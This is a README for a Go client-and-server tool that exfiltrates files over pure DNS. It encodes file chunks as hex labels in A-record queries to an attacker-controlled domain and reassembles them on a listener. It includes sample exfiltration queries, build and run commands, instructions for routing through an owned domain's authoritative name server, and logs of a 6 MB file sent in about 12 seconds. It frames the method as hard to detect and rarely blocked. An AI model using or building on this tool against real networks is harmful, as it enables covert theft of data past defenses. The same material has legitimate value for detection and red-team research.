# Data Exfiltration using pure DNS

## Demo

https://www.youtube.com/watch?v=NtNpLDhnbno

## Why

Pure DNS data exfilitration is difficult to detect and most environments do not block outgoing DNS traffic. The data itself is masquerading as `A` record DNS requests.

## How it works

We split the file (data) into chunks and send them via DNS requests, up to 3 chunks at a time. For example a small file like `go.mod` will result in the following `A` record DNS requests:
```
6d6f64756c65206769746875622e636f6d2f7477697a3731382f646e732d65.7866696c74726174696f6e0a0a676f20312e32332e310a0a72657175697265.20280a096769746875622e636f6d2f6861736869636f72702f676f6c616e67.exfil
2d6c72752f76322076322e302e370a096769746875622e636f6d2f6d69656b.672f646e732076312e312e36340a096769746875622e636f6d2f7374726574.6368722f746573746966792076312e31302e300a290a0a7265717569726520.exfil
280a096769746875622e636f6d2f646176656367682f676f2d737065772076.312e312e31202f2f20696e6469726563740a096769746875622e636f6d2f70.6d657a6172642f676f2d646966666c69622076312e302e30202f2f20696e64.exfil
69726563740a09676f6c616e672e6f72672f782f6d6f642076302e32332e30.202f2f20696e6469726563740a09676f6c616e672e6f72672f782f6e657420.76302e33352e30202f2f20696e6469726563740a09676f6c616e672e6f7267.exfil
2f782f73796e632076302e31312e30202f2f20696e6469726563740a09676f.6c616e672e6f72672f782f7379732076302e33302e30202f2f20696e646972.6563740a09676f6c616e672e6f72672f782f746f6f6c732076302e33302e30.exfil
202f2f20696e6469726563740a09676f706b672e696e2f79616d6c2e763320.76332e302e31202f2f20696e6469726563740a290a.exfil
```

The segments in the fully qualified domain names are the hex representations of the file data chunks. 

The DNS requests themselves will also include [EDNS0](https://en.wikipedia.org/wiki/Extension_Mechanisms_for_DNS) keys/values for file related metadata to assist the server with reassembly.

The server will save all the data chunks until it receives the last one and then write the data out to a file.


## Server

### Building

#### Building on Windows
`go build -o server.exe main.go`

#### Building on Linux / macOS
`go build -o server main.go`

### Running

There are two ways to run the server:

1. You can run it on any machine that can receive traffic from the Internet and then hit it directly via the `send` (client) program.
2. You can run this on your own registered domain's authoritative NS as the listener. ie: you own `foobarbaz.net`, you would modify the server and client code and replace every occurrence of `exfil` with `foobarbaz.net`. Then when you run `send` you would point it to your resolver and it would find the authoritative NS for `foobarbaz.net` and send the queries there.

### Usage
```
  -debug
        enable debug output
  -port int
        dns server port (default 5555)
```

## Client

### Building

#### Building on Windows

`go build -o send.exe .\cmd\send.go`

#### Building on Linux or macOS

`go build -o send ./cmd/send.go`

### Running

Sending a `6mb` file takes `~12s` via pure DNS:

```
PS C:\Users\akhanin\go\src\dns-exfiltration> .\send.exe -file C:\Users\akhanin\Documents\warez_book_0339.1.00.pdf -port 5555 -server 127.0.0.1
Time elapsed: 12.1207572s
```

On the server side:
```
.\server.exe 
2025/04/05 16:04:26 Server is starting on port 5555
2025/04/05 16:04:31 Cache is currently empty.
2025/04/05 16:04:31 Incoming file with md5: 479476f1023f5b5007c2b444e191c5d9, expected number of chunks: 192925
2025/04/05 16:04:36 Number of keys in cache: 1. Keys = [479476f1023f5b5007c2b444e191c5d9]
2025/04/05 16:04:41 Number of keys in cache: 1. Keys = [479476f1023f5b5007c2b444e191c5d9]
2025/04/05 16:04:43 Finished writing data for 479476f1023f5b5007c2b444e191c5d9
2025/04/05 16:04:46 Cache is currently empty.
```

Checking the file sent:
```
PS C:\Users\akhanin\go\src\dns-exfiltration> dir .\479476f1023f5b5007c2b444e191c5d9.data


    Directory: C:\Users\akhanin\go\src\dns-exfiltration


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          4/5/2025   4:04 PM        5980656 479476f1023f5b5007c2b444e191c5d9.data
```

Checking the file type:
```
akhanin@SUPERUNKNOWN2020 ~/dev/dns-exfiltration
$ file 479476f1023f5b5007c2b444e191c5d9.data
479476f1023f5b5007c2b444e191c5d9.data: PDF document, version 1.3 (password protected)
```
